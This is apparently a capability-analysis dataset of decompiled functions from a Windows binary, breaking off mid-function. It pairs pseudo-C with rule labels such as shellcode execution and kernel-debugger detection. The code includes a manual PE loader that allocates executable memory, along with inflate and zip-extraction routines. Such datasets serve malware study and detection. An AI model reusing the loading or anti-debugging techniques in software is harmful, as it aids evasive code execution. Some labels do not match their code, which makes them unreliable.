{
    "004046e0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuchar fcn.004046e0(void)\n\n{\n    int32_t arg_ch;\n    int32_t arg_8h;\n    int32_t iVar1;\n    int32_t *unaff_EBX;\n    int16_t *unaff_ESI;\n    \n    if (0x3f < unaff_EBX[1]) {\n        fcn.0042f700(unaff_ESI, *unaff_EBX, 0x40);\n        if ((*unaff_ESI != 0x5a4d) || (iVar1 = *(unaff_ESI + 0x1e),  iVar1 == 0)) {\n            return 2;\n        }\n        if (iVar1 + 0xf8U < unaff_EBX[1] || iVar1 + 0xf8U == unaff_EBX[1]) {\n            fcn.0042f700(unaff_ESI + 0x20, *unaff_EBX + iVar1, 0xf8);\n            if (((*(unaff_ESI + 0x20) == 0x4550) && (unaff_ESI[0x2c] == 0x10b)) && (unaff_ESI[0x23] != 0)) {\n                iVar1 = unaff_ESI[0x23] * 0x28;\n                *(unaff_ESI + 0xa0) = iVar1;\n                arg_8h = fcn.0042d6d0(iVar1);\n                *(unaff_ESI + 0x9c) = arg_8h;\n                if (arg_8h == 0) {\n                    return 3;\n                }\n                arg_ch = unaff_ESI[0x2a] + 0x18 + *(unaff_ESI + 0x1e);\n                *(unaff_ESI + 0x9e) = arg_ch;\n                iVar1 = fcn.00404d60(arg_8h, arg_ch, iVar1, unaff_EBX);\n                return iVar1 == 0;\n            }\n            return 2;\n        }\n    }\n    return true;\n}\n",
        "token_count": 461
    },
    "004047b0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t fcn.004047b0(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    int32_t unaff_ESI;\n    uint32_t uVar5;\n    uint32_t var_4h;\n    \n    uVar4 = 0;\n    uVar5 = 0;\n    if (*(unaff_ESI + 0x46) != 0) {\n        var_4h = *(unaff_ESI + 0x46);\n        puVar3 = *(unaff_ESI + 0x138) + 0xc;\n        do {\n            if (puVar3[-1] != 0) {\n                uVar1 = *puVar3;\n                if (uVar1 < uVar4) {\n                    uVar4 = uVar1;\n                }\n                uVar1 = uVar1 + puVar3[-1];\n                if (uVar5 < uVar1) {\n                    uVar5 = uVar1;\n                }\n            }\n            puVar3 = puVar3 + 10;\n            var_4h = var_4h - 1;\n        } while (var_4h != 0);\n    }\n    iVar2 = (**0x4574cc)(*(unaff_ESI + 0x74) + uVar4, uVar5 - uVar4, 0x3000, 0x40);\n    *(unaff_ESI + 0x148) = iVar2;\n    *(unaff_ESI + 0x144) = *(unaff_ESI + 0x74);\n    if (iVar2 == 0) {\n        if ((*(unaff_ESI + 0x56) & 1) != 0) {\n            return 4;\n        }\n        iVar2 = (**0x4574cc)(0, uVar5 - uVar4, 0x3000, 0x40);\n        *(unaff_ESI + 0x148) = iVar2;\n        *(unaff_ESI + 0x144) = iVar2 - uVar4;\n    }\n    return (-(*(unaff_ESI + 0x148) != 0) & 0xfffffffd) + 3;\n}\n",
        "token_count": 500
    },
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl method.std::bad_alloc.virtual_0(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::bad_alloc.0;\n    fcn.0042d866();\n    if ((arg_8h & 1) != 0) {\n        fcn.0042d62b();\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "0040a610": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040a610(uint8_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint8_t *puVar3;\n    uint8_t **in_EAX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    uint *puVar7;\n    uint8_t uVar8;\n    uint32_t *in_ECX;\n    uint8_t *puVar9;\n    int32_t iVar10;\n    uint8_t *puVar11;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    uint8_t *var_20h;\n    int32_t var_1ch;\n    uint8_t *var_18h;\n    uint8_t *var_14h;\n    uint8_t *var_10h;\n    uint8_t *var_ch;\n    uint8_t *var_8h;\n    uint32_t var_4h;\n    \n    var_8h = *in_EAX;\n    var_ch = in_EAX[1];\n    var_10h = in_ECX[0xd];\n    uVar5 = in_ECX[8];\n    puVar11 = in_ECX[7];\n    if (var_10h < in_ECX[0xc]) {\n        var_18h = in_ECX[0xc] + (-1 - var_10h);\n    }\n    else {\n        var_18h = in_ECX[0xb] - var_10h;\n    }\n    uVar4 = *in_ECX;\n    var_4h = uVar5;\n    do {\n    // switch table (10 cases) at 0x40af84\n        switch(uVar4) {\n        case 0:\n            for (; puVar11 < 0x3; puVar11 = puVar11 + 8) {\n                if (var_ch == NULL) goto code_r0x0040ad2b;\n                var_ch = var_ch + -1;\n                arg_8h = NULL;\n                uVar5 = uVar5 | *var_8h << (puVar11 & 0x1f);\n                var_8h = var_8h + 1;\n                var_4h = uVar5;\n            }\n            in_ECX[6] = uVar5 & 1;\n    // switch table (4 cases) at 0x40afac\n            switch((uVar5 & 7) >> 1) {\n            case 0:\n                uVar4 = puVar11 + -3 & 7;\n                uVar5 = (uVar5 >> 3) >> uVar4;\n                puVar11 = puVar11 + -3 + -uVar4;\n                *in_ECX = 1;\n                var_4h = uVar5;\n                break;\n            case 1:\n                uVar5 = fcn.00409e60(9, 5, 0x44d0b0, 0x44e0b0);\n                in_ECX[1] = uVar5;\n                if (uVar5 == 0) {\n                    arg_8h = 0xfffffffc;\n                    goto code_r0x0040acfb;\n                }\n                uVar5 = var_4h >> 3;\n                puVar11 = puVar11 + -3;\n                *in_ECX = 6;\n                var_4h = uVar5;\n                break;\n            case 2:\n                uVar5 = uVar5 >> 3;\n                puVar11 = puVar11 + -3;\n                *in_ECX = 3;\n                var_4h = uVar5;\n                break;\n            case 3:\n                *in_ECX = 9;\n                in_EAX[6] = \"invalid block type\";\n                in_ECX[8] = var_4h >> 3;\n                in_ECX[7] = puVar11 + -3;\n                in_EAX[1] = var_ch;\n                arg_8h = 0xfffffffd;\n                goto code_r0x0040ad0a;\n            }\n            break;\n        case 1:\n            for (; puVar11 < 0x20; puVar11 = puVar11 + 8) {\n                if (var_ch == NULL) goto code_r0x0040ad74;\n                var_ch = var_ch + -1;\n                arg_8h = NULL;\n                uVar5 = uVar5 | *var_8h << (puVar11 & 0x1f);\n                var_8h = var_8h + 1;\n                var_4h = uVar5;\n            }\n            uVar4 = uVar5 & 0xffff;\n            if (~uVar5 >> 0x10 != uVar4) {\n                *in_ECX = 9;\n                in_EAX[6] = \"invalid stored block lengths\";\n                arg_8h = 0xfffffffd;\n                goto code_r0x0040acfb;\n            }\n            puVar11 = NULL;\n            in_ECX[1] = uVar4;\n            var_4h = 0;\n            uVar5 = 0;\n            if (uVar4 == 0) {\n                *in_ECX = -(in_ECX[6] != 0) & 7;\n            }\n            else {\n                *in_ECX = 2;\n            }\n            break;\n        case 2:\n            if (var_ch == NULL) {\ncode_r0x0040ad74:\n                in_ECX[8] = var_4h;\n                goto code_r0x0040ad31;\n            }\n            if (var_18h == NULL) {\n                if (var_10h == in_ECX[0xb]) {\n                    puVar9 = in_ECX[0xc];\n                    puVar3 = in_ECX[10];\n                    if (puVar3 != puVar9) {\n                        if (puVar3 < puVar9) {\n                            var_18h = puVar9 + (-1 - puVar3);\n                        }\n                        else {\n                            var_18h = in_ECX[0xb] + -puVar3;\n                        }\n                        var_10h = puVar3;\n                        if (var_18h != NULL) goto code_r0x0040a838;\n                    }\n                }\n                in_ECX[0xd] = var_10h;\n                arg_8h = fcn.00409d60(arg_8h);\n                puVar9 = in_ECX[0xc];\n                var_10h = in_ECX[0xd];\n                if (var_10h < puVar9) {\n                    var_18h = puVar9 + (-1 - var_10h);\n                }\n                else {\n                    var_18h = in_ECX[0xb] - var_10h;\n                }\n                if (var_10h == in_ECX[0xb]) {\n                    puVar3 = in_ECX[10];\n                    if (puVar3 != puVar9) {\n                        var_10h = puVar3;\n                        if (puVar3 < puVar9) {\n                            var_18h = puVar9 + (-1 - puVar3);\n                        }\n                        else {\n                            var_18h = in_ECX[0xb] + -puVar3;\n                        }\n                    }\n                }\n                if (var_18h == NULL) {\n                    in_ECX[8] = var_4h;\n                    in_ECX[7] = puVar11;\n                    iVar10 = var_8h - *in_EAX;\n                    *in_EAX = var_8h;\n                    in_EAX[1] = var_ch;\n                    goto code_r0x0040ad13;\n                }\n            }\ncode_r0x0040a838:\n            arg_8h = NULL;\n            var_14h = in_ECX[1];\n            if (var_ch < in_ECX[1]) {\n                var_14h = var_ch;\n            }\n            if (var_18h < var_14h) {\n                var_14h = var_18h;\n            }\n            fcn.0042f700(var_10h, var_8h, var_14h);\n            var_8h = var_8h + var_14h;\n            var_ch = var_ch + -var_14h;\n            var_10h = var_10h + var_14h;\n            var_18h = var_18h + -var_14h;\n            puVar1 = in_ECX + 1;\n            *puVar1 = *puVar1 - var_14h;\n            uVar5 = var_4h;\n            if (*puVar1 == 0) {\n                *in_ECX = -(in_ECX[6] != 0) & 7;\n            }\n            break;\n        case 3:\n            for (; puVar11 < 0xe; puVar11 = puVar11 + 8) {\n                if (var_ch == NULL) goto code_r0x0040adb1;\n                var_ch = var_ch + -1;\n                arg_8h = NULL;\n                uVar5 = uVar5 | *var_8h << (puVar11 & 0x1f);\n                var_8h = var_8h + 1;\n                var_4h = uVar5;\n            }\n            in_ECX[1] = uVar5 & 0x3fff;\n            if ((0x1d < (uVar5 & 0x1f)) || (uVar4 = (uVar5 & 0x3fff) >> 5 & 0x1f,  0x1d < uVar4)) {\n                *in_ECX = 9;\n                in_EAX[6] = \"too many length or distance symbols\";\n                goto code_r0x0040ae09;\n            }\n            uVar5 = (*in_EAX[8])(in_EAX[10], uVar4 + 0x102 + (uVar5 & 0x1f), 4);\n            in_ECX[3] = uVar5;\n            if (uVar5 != 0) {\n                uVar5 = var_4h >> 0xe;\n                puVar11 = puVar11 + -0xe;\n                in_ECX[2] = 0;\n                *in_ECX = 4;\n                var_4h = uVar5;\n                goto code_r0x0040a935;\n            }\n            goto code_r0x0040ade6;\n        case 4:\ncode_r0x0040a935:\n            if (in_ECX[2] < (in_ECX[1] >> 10) + 4) {\n                do {\n                    for (; puVar11 < 0x3; puVar11 = puVar11 + 8) {\n                        if (var_ch == NULL) {\ncode_r0x0040adb1:\n                            in_ECX[8] = var_4h;\n                            in_ECX[7] = puVar11;\n                            puVar11 = *in_EAX;\n                            *in_EAX = var_8h;\n                            in_EAX[2] = in_EAX[2] + (var_8h - puVar11);\n                            in_EAX[1] = NULL;\n                            in_ECX[0xd] = var_10h;\n                            fcn.00409d60(arg_8h);\n                            return;\n                        }\n                        var_ch = var_ch + -1;\n                        arg_8h = NULL;\n                        var_4h = uVar5 | *var_8h << (puVar11 & 0x1f);\n                        var_8h = var_8h + 1;\n                        uVar5 = var_4h;\n                    }\n                    *(in_ECX[3] + *(in_ECX[2] * 4 + 0x44e1b0) * 4) = uVar5 & 7;\n                    in_ECX[2] = in_ECX[2] + 1;\n                    var_4h = var_4h >> 3;\n                    puVar11 = puVar11 + -3;\n                    uVar5 = var_4h;\n                } while (in_ECX[2] < (in_ECX[1] >> 10) + 4);\n            }\n            uVar5 = in_ECX[2];\n            while (uVar5 < 0x13) {\n                *(in_ECX[3] + *(in_ECX[2] * 4 + 0x44e1b0) * 4) = 0;\n                in_ECX[2] = in_ECX[2] + 1;\n                uVar5 = in_ECX[2];\n            }\n            in_ECX[4] = 7;\n            var_14h = fcn.0040b590(in_ECX[3], in_ECX + 4, in_ECX + 5, in_ECX[9]);\n            if (var_14h == NULL) {\n                in_ECX[2] = 0;\n                *in_ECX = 5;\n                uVar5 = var_4h;\n                goto code_r0x0040aa11;\n            }\n            if (var_14h == 0xfffffffd) {\n                (*in_EAX[9])(in_EAX[10], in_ECX[3]);\n                *in_ECX = 9;\n            }\n            in_ECX[8] = var_4h;\n            in_ECX[7] = puVar11;\n            in_EAX[1] = var_ch;\n            iVar10 = var_8h - *in_EAX;\n            *in_EAX = var_8h;\n            arg_8h = var_14h;\n            goto code_r0x0040ad13;\n        case 5:\ncode_r0x0040aa11:\n            if (in_ECX[2] < (in_ECX[1] >> 5 & 0x1f) + 0x102 + (in_ECX[1] & 0x1f)) {\n                do {\n                    puVar9 = in_ECX[4];\n                    if (puVar11 < puVar9) {\n                        do {\n                            if (var_ch == NULL) goto code_r0x0040adb1;\n                            var_ch = var_ch + -1;\n                            uVar8 = puVar11;\n                            puVar9 = in_ECX[4];\n                            puVar11 = puVar11 + 8;\n                            arg_8h = NULL;\n                            uVar5 = uVar5 | *var_8h << (uVar8 & 0x1f);\n                            var_8h = var_8h + 1;\n                            var_4h = uVar5;\n                        } while (puVar11 < puVar9);\n                    }\n                    iVar10 = in_ECX[5] + (*(puVar9 * 4 + 0x44d068) & uVar5) * 8;\n                    uVar8 = *(iVar10 + 1);\n                    var_14h = uVar8;\n                    var_24h = *(iVar10 + 4);\n                    if (var_24h < 0x10) {\n                        var_4h = uVar5 >> (uVar8 & 0x1f);\n                        puVar11 = puVar11 + -var_14h;\n                        *(in_ECX[3] + in_ECX[2] * 4) = var_24h;\n                        in_ECX[2] = in_ECX[2] + 1;\n                    }\n                    else {\n                        if (var_24h == 0x12) {\n                            var_1ch = 7;\n                        }\n                        else {\n                            var_1ch = var_24h - 0xe;\n                        }\n                        var_18h = (var_24h == 0x12) * 8 + 3;\n                        var_20h = var_14h + var_1ch;\n                        for (; puVar11 < var_20h; puVar11 = puVar11 + 8) {\n                            if (var_ch == NULL) goto code_r0x0040ad2b;\n                            var_ch = var_ch + -1;\n                            uVar2 = *var_8h;\n                            var_8h = var_8h + 1;\n                            uVar5 = uVar5 | uVar2 << (puVar11 & 0x1f);\n                            arg_8h = NULL;\n                            var_4h = uVar5;\n                        }\n                        uVar5 = uVar5 >> (uVar8 & 0x1f);\n                        var_18h = var_18h + (*(var_1ch * 4 + 0x44d068) & uVar5);\n                        var_4h = uVar5 >> (var_1ch & 0x1f);\n                        puVar11 = puVar11 + -(var_14h + var_1ch);\n                        uVar5 = in_ECX[2];\n                        if ((in_ECX[1] >> 5 & 0x1f) + 0x102 + (in_ECX[1] & 0x1f) < var_18h + uVar5) {\ncode_r0x0040ae78:\n                            (*in_EAX[9])(in_EAX[10], in_ECX[3]);\n                            *in_ECX = 9;\n                            in_EAX[6] = \"invalid bit length repeat\";\n                            in_ECX[8] = var_4h;\n                            in_ECX[7] = puVar11;\n                            in_EAX[1] = var_ch;\n                            in_EAX[2] = in_EAX[2] + (var_8h - *in_EAX);\n                            *in_EAX = var_8h;\n                            in_ECX[0xd] = var_10h;\n                            fcn.00409d60(0xfffffffd);\n                            return;\n                        }\n                        if (var_24h == 0x10) {\n                            if (uVar5 == 0) goto code_r0x0040ae78;\n                            uVar6 = *((in_ECX[3] - 4) + uVar5 * 4);\n                        }\n                        else {\n                            uVar6 = 0;\n                        }\n                        do {\n                            *(in_ECX[3] + uVar5 * 4) = uVar6;\n                            uVar5 = uVar5 + 1;\n                            var_18h = var_18h + -1;\n                        } while (var_18h != NULL);\n                        in_ECX[2] = uVar5;\n                    }\n                    uVar5 = var_4h;\n                } while (in_ECX[2] < (in_ECX[1] >> 5 & 0x1f) + 0x102 + (in_ECX[1] & 0x1f));\n            }\n            in_ECX[5] = 0;\n            var_1ch = 9;\n            var_18h = 0x6;\n            var_14h = fcn.0040b620((in_ECX[1] & 0x1f) + 0x101, (in_ECX[1] >> 5 & 0x1f) + 1, in_ECX[3], &var_1ch, \n                                   &var_18h, &var_28h, &var_2ch, in_ECX[9]);\n            if (var_14h != NULL) {\n                if (var_14h == 0xfffffffd) {\n                    (*in_EAX[9])(in_EAX[10], in_ECX[3]);\n                    *in_ECX = 9;\n                }\n                in_ECX[8] = var_4h;\n                in_ECX[7] = puVar11;\n                in_EAX[1] = var_ch;\n                in_EAX[2] = in_EAX[2] + (var_8h - *in_EAX);\n                *in_EAX = var_8h;\n                in_ECX[0xd] = var_10h;\n                fcn.00409d60(var_14h);\n                return;\n            }\n            puVar7 = (*in_EAX[8])(in_EAX[10], 1, 0x1c);\n            if (puVar7 == NULL) {\ncode_r0x0040ade6:\n                in_ECX[8] = var_4h;\n                in_ECX[7] = puVar11;\n                in_EAX[1] = var_ch;\n                arg_8h = 0xfffffffc;\n                goto code_r0x0040ad0a;\n            }\n            *(puVar7 + 4) = var_1ch;\n            *(puVar7 + 0x11) = var_18h._0_1_;\n            *puVar7 = 0;\n            puVar7[5] = var_28h;\n            puVar7[6] = var_2ch;\n            in_ECX[1] = puVar7;\n            (*in_EAX[9])(in_EAX[10], in_ECX[3]);\n            *in_ECX = 6;\ncode_r0x0040ac57:\n            in_ECX[8] = var_4h;\n            in_ECX[7] = puVar11;\n            in_EAX[1] = var_ch;\n            in_EAX[2] = in_EAX[2] + (var_8h - *in_EAX);\n            *in_EAX = var_8h;\n            in_ECX[0xd] = var_10h;\n            iVar10 = fcn.00409ea0(arg_8h);\n            if (iVar10 != 1) goto code_r0x0040af58;\n            arg_8h = NULL;\n            (*in_EAX[9])(in_EAX[10], in_ECX[1]);\n            var_ch = in_EAX[1];\n            uVar5 = in_ECX[8];\n            var_8h = *in_EAX;\n            puVar11 = in_ECX[7];\n            var_10h = in_ECX[0xd];\n            if (var_10h < in_ECX[0xc]) {\n                var_18h = in_ECX[0xc] + (-1 - var_10h);\n            }\n            else {\n                var_18h = in_ECX[0xb] - var_10h;\n            }\n            var_4h = uVar5;\n            if (in_ECX[6] != 0) {\n                *in_ECX = 7;\n                goto code_r0x0040af1a;\n            }\n            *in_ECX = 0;\n            break;\n        case 6:\n            goto code_r0x0040ac57;\n        case 7:\ncode_r0x0040af1a:\n            in_ECX[0xd] = var_10h;\n            iVar10 = fcn.00409d60(arg_8h);\n            var_10h = in_ECX[0xd];\n            if (in_ECX[0xc] != var_10h) {\n                in_ECX[8] = var_4h;\n                in_ECX[7] = puVar11;\n                in_EAX[1] = var_ch;\n                puVar11 = *in_EAX;\n                *in_EAX = var_8h;\n                in_EAX[2] = in_EAX[2] + (var_8h - puVar11);\n                in_ECX[0xd] = var_10h;\ncode_r0x0040af58:\n                fcn.00409d60(iVar10);\n                return;\n            }\n            *in_ECX = 8;\n        case 8:\n            goto code_r0x0040af6e;\n        case 9:\ncode_r0x0040ae09:\n            in_ECX[8] = var_4h;\n            in_ECX[7] = puVar11;\n            puVar11 = *in_EAX;\n            *in_EAX = var_8h;\n            in_EAX[2] = in_EAX[2] + (var_8h - puVar11);\n            in_EAX[1] = var_ch;\n            in_ECX[0xd] = var_10h;\n            fcn.00409d60(0xfffffffd);\n            return;\n        default:\n            arg_8h = 0xfffffffe;\ncode_r0x0040acfb:\n            in_ECX[8] = var_4h;\n            in_ECX[7] = puVar11;\n            in_EAX[1] = var_ch;\n            goto code_r0x0040ad0a;\n        }\n        uVar4 = *in_ECX;\n    } while( true );\ncode_r0x0040ad2b:\n    in_ECX[8] = var_4h;\ncode_r0x0040ad31:\n    in_ECX[7] = puVar11;\n    iVar10 = var_8h - *in_EAX;\n    *in_EAX = var_8h;\n    in_EAX[1] = NULL;\n    goto code_r0x0040ad13;\ncode_r0x0040af6e:\n    in_ECX[8] = var_4h;\n    in_ECX[7] = puVar11;\n    in_EAX[1] = var_ch;\n    arg_8h = 0x1;\ncode_r0x0040ad0a:\n    iVar10 = var_8h - *in_EAX;\n    *in_EAX = var_8h;\ncode_r0x0040ad13:\n    in_EAX[2] = in_EAX[2] + iVar10;\n    in_ECX[0xd] = var_10h;\n    fcn.00409d60(arg_8h);\n    return;\n}\n",
        "token_count": 5710
    },
    "0040d0d0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d0d0(char *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *arg_8h_00;\n    int32_t *unaff_EBX;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if ((unaff_EBX == NULL) || (unaff_EBX[6] == 0)) {\n        return 0xffffff9a;\n    }\n    if (unaff_EBX[0x1f] != 0) {\n        fcn.0040d4a0();\n    }\n    iVar1 = fcn.0040ce20(&var_ch, &var_4h, &var_8h);\n    if (iVar1 != 0) {\n        return 0xffffff99;\n    }\n    arg_8h_00 = fcn.0042d6d0(0x84);\n    if (arg_8h_00 != NULL) {\n        iVar1 = fcn.0042d6d0(0x4000);\n        *arg_8h_00 = iVar1;\n        arg_8h_00[0x11] = var_4h;\n        arg_8h_00[0x12] = var_8h;\n        arg_8h_00[0x13] = 0;\n        if (iVar1 != 0) {\n            arg_8h_00[0x10] = 0;\n            iVar1 = unaff_EBX[0xd];\n            arg_8h_00[0x15] = unaff_EBX[0xf];\n            arg_8h_00[0x14] = 0;\n            arg_8h_00[0x19] = unaff_EBX[0xd];\n            arg_8h_00[0x18] = *unaff_EBX;\n            arg_8h_00[0x1a] = unaff_EBX[3];\n            arg_8h_00[6] = 0;\n            if (iVar1 != 0) {\n                arg_8h_00[9] = 0;\n                arg_8h_00[10] = 0;\n                arg_8h_00[0xb] = 0;\n                iVar1 = fcn.0040bea0();\n                if (iVar1 == 0) {\n                    arg_8h_00[0x10] = 1;\n                }\n            }\n            arg_8h_00[0x16] = unaff_EBX[0x10];\n            arg_8h_00[0x17] = unaff_EBX[0x11];\n            *(arg_8h_00 + 0x1b) = *(unaff_EBX + 0xc) & 1;\n            if ((unaff_EBX[0xc] >> 3 & 1) == 0) {\n                *(arg_8h_00 + 0x20) = *(unaff_EBX + 0x3f);\n            }\n            else {\n                *(arg_8h_00 + 0x20) = *(unaff_EBX + 0x39);\n            }\n            arg_8h_00[0x1f] = -(*(arg_8h_00 + 0x1b) != '\\0') & 0xc;\n            arg_8h_00[0x1c] = 0x12345678;\n            arg_8h_00[0x1d] = 0x23456789;\n            arg_8h_00[0x1e] = 0x34567890;\n            if (arg_8h != NULL) {\n                do {\n                    if (*arg_8h == '\\0') break;\n                    fcn.0040bbd0();\n                    arg_8h = arg_8h + 1;\n                } while (arg_8h != NULL);\n            }\n            arg_8h_00[0xf] = unaff_EBX[0x1e] + 0x1e + var_ch;\n            arg_8h_00[2] = 0;\n            unaff_EBX[0x1f] = arg_8h_00;\n            return 0;\n        }\n        fcn.0042d696(arg_8h_00);\n    }\n    return 0xffffff98;\n}\n",
        "token_count": 970
    },
    "0040d620": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040d620(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char cVar4;\n    char *pcVar5;\n    unkint3 Var6;\n    uint8_t uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint *puVar10;\n    int32_t iVar11;\n    uint *puVar12;\n    uint8_t uVar13;\n    int32_t *in_ECX;\n    int32_t iVar14;\n    uint8_t *puVar15;\n    uint8_t uVar16;\n    int32_t *in_EDX;\n    int32_t *piVar17;\n    uint *puVar18;\n    bool bVar19;\n    ulong uVar20;\n    uint in_stack_fffffd4c;\n    uint32_t var_2ach;\n    uint32_t var_29ch;\n    int32_t var_294h;\n    int32_t var_290h;\n    uint32_t var_278h;\n    uint var_258h;\n    uint var_254h;\n    int32_t var_250h;\n    int32_t var_24ch;\n    uint var_248h;\n    uint var_244h;\n    int32_t *var_240h;\n    int32_t *var_23ch;\n    uint32_t var_238h;\n    uint32_t var_234h;\n    uint8_t var_230h;\n    uint8_t var_22fh;\n    uint8_t var_22eh;\n    uint var_22dh;\n    uint var_226h;\n    uint16_t var_222h;\n    int16_t var_220h;\n    ushort var_21eh;\n    uint var_21ch;\n    uint var_114h;\n    uint32_t var_8h;\n    \n    var_8h = *0x454664 ^ &stack0xfffffffc;\n    if ((arg_8h < -1) || (*(*in_ECX + 4) <= arg_8h)) {\n        fcn.0042d636(in_stack_fffffd4c);\n        return;\n    }\n    var_240h = in_EDX;\n    var_23ch = in_ECX;\n    if (in_ECX[1] != -1) {\n        fcn.0040d4a0();\n    }\n    in_ECX[1] = -1;\n    if (arg_8h == in_ECX[0x4d]) {\n        if (arg_8h != -1) {\n            piVar17 = in_ECX + 2;\n            for (iVar14 = 0x4b; iVar14 != 0; iVar14 = iVar14 + -1) {\n                *var_240h = *piVar17;\n                piVar17 = piVar17 + 1;\n                var_240h = var_240h + 1;\n            }\n            fcn.0042d636(in_stack_fffffd4c);\n            return;\n        }\ncode_r0x0040d6a9:\n        *in_EDX = *(*in_ECX + 4);\n        *(in_EDX + 1) = 0;\n        in_EDX[0x42] = 0;\n        in_EDX[0x43] = 0;\n        in_EDX[0x44] = 0;\n        in_EDX[0x45] = 0;\n        in_EDX[0x46] = 0;\n        in_EDX[0x47] = 0;\n        in_EDX[0x48] = 0;\n        in_EDX[0x49] = 0;\n        in_EDX[0x4a] = 0;\n        fcn.0042d636(in_stack_fffffd4c);\n        return;\n    }\n    if (arg_8h == -1) goto code_r0x0040d6a9;\n    if (arg_8h < *(*in_ECX + 0x10)) {\n        fcn.0040cc80();\n    }\n    iVar14 = *(*in_ECX + 0x10);\n    while (iVar14 < arg_8h) {\n        iVar14 = *in_ECX;\n        if (((iVar14 != 0) && (*(iVar14 + 0x18) != 0)) && (iVar8 = *(iVar14 + 0x10) + 1,  iVar8 != *(iVar14 + 4))) {\n            *(iVar14 + 0x14) = *(iVar14 + 0x14) + *(iVar14 + 0x50) + *(iVar14 + 0x4c) + 0x2e + *(iVar14 + 0x48);\n            *(iVar14 + 0x10) = iVar8;\n            iVar8 = fcn.0040c880(iVar14 + 0x28, iVar14 + 0x78, 0, 0);\n            *(iVar14 + 0x18) = iVar8 == 0;\n        }\n        iVar14 = *(*in_ECX + 0x10);\n    }\n    fcn.0040c880(&var_2ach, 0, &var_114h, 0x104);\n    iVar14 = fcn.0040ce20(&var_244h, &var_234h, &var_238h);\n    if (iVar14 != 0) {\n        fcn.0042d636(in_stack_fffffd4c);\n        return;\n    }\n    pcVar5 = **in_ECX;\n    if (*pcVar5 == '\\0') {\n        *(pcVar5 + 0x1c) = var_234h;\n    }\n    else {\n        if (pcVar5[1] == '\\0') goto code_r0x0040d822;\n        (**0x4573d0)(*(pcVar5 + 4), *(pcVar5 + 0xc) + var_234h, 0, 0);\n    }\n    uVar9 = var_238h;\n    iVar14 = fcn.0042cbeb(var_238h);\n    uVar9 = fcn.0040c2f0(iVar14, uVar9);\n    if (uVar9 == var_238h) {\n        *var_240h = *(*var_23ch + 0x10);\n        iVar8 = 0;\n        do {\n            pcVar5 = &var_114h + iVar8;\n            *(&var_21ch + iVar8) = *pcVar5;\n            iVar8 = iVar8 + 1;\n        } while (*pcVar5 != '\\0');\n        puVar18 = &var_21ch;\n        while( true ) {\n            while( true ) {\n                while( true ) {\n                    while( true ) {\n                        while( true ) {\n                            while( true ) {\n                                for (; (cVar4 = *puVar18,  cVar4 != '\\0' && (*(puVar18 + 1) == ':'));\n                                    puVar18 = puVar18 + 2) {\n                                }\n                                if (cVar4 != '\\\\') break;\n                                puVar18 = puVar18 + 1;\n                            }\n                            if (cVar4 != '/') break;\n                            puVar18 = puVar18 + 1;\n                        }\n                        iVar8 = fcn.0042e15c(puVar18, \"\\\\..\\\\\");\n                        if (iVar8 == 0) break;\n                        puVar18 = iVar8 + 4;\n                    }\n                    iVar8 = fcn.0042e15c(puVar18, \"\\\\../\");\n                    if (iVar8 == 0) break;\n                    puVar18 = iVar8 + 4;\n                }\n                iVar8 = fcn.0042e15c(puVar18, \"/../\");\n                if (iVar8 == 0) break;\n                puVar18 = iVar8 + 4;\n            }\n            iVar8 = fcn.0042e15c(puVar18, \"/..\\\\\");\n            if (iVar8 == 0) break;\n            puVar18 = iVar8 + 4;\n        }\n        fcn.0042dfd8(var_240h + 1, puVar18, 0x104);\n        var_22dh._0_1_ = var_278h >> 0x1e & 1;\n        uVar16 = ~(var_278h >> 0x17);\n        var_2ach = var_2ach >> 8;\n        var_22fh = 0;\n        var_230h = 0;\n        var_22eh = 1;\n        if (((var_2ach == 0) || (var_2ach == 7)) || ((var_2ach == 0xb || (var_2ach == 0xe)))) {\n            var_22fh = var_278h >> 1 & 1;\n            var_230h = var_278h >> 2 & 1;\n            uVar16 = var_278h;\n            uVar7 = var_278h >> 5 & 1;\n            uVar13 = var_278h >> 4 & 1;\n        }\n        else {\n            uVar7 = 1;\n            uVar13 = var_22dh;\n        }\n        var_240h[0x42] = 0;\n        if (uVar13 != 0) {\n            var_240h[0x42] = 0x10;\n        }\n        if (uVar7 != 0) {\n            var_240h[0x42] = var_240h[0x42] | 0x20;\n        }\n        if (var_22fh != 0) {\n            var_240h[0x42] = var_240h[0x42] | 2;\n        }\n        if ((uVar16 & 1) != 0) {\n            var_240h[0x42] = var_240h[0x42] | 1;\n        }\n        if (var_230h != 0) {\n    